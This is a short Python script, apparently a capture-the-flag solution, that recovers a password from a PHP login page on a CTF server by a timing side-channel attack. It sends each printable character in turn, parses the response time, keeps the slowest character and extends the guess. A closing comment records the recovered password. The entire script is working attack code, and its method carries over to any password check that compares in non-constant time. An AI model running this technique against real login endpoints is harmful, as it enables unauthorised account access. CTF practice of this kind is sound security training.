import requests
import string

r = requests.get('http://ctf.hackucf.org:4000/bad_code/bad_code.php?passwd=')

runningPwd = ''
loop = 0
while 1: 
    alpha = string.printable
    runningTime = 0.0
    bestChar = ''
    for i in alpha: 
        runningPwd += i
        response = requests.get('http://ctf.hackucf.org:4000/bad_code/bad_code.php', params={'passwd': runningPwd})

        time = response.text.split('<time>')[1]
        time = time.split('</time>')[0]
        print(time, i)
        if (float(time) > float(runningTime)) :
            print('here')
            runningTime = time
            bestChar = i
        runningPwd = runningPwd[:-1] #remove letter tested
    runningPwd += bestChar
    loop += 1
    print(loop)
    print(runningPwd)

    #pwd is AT2B1HDI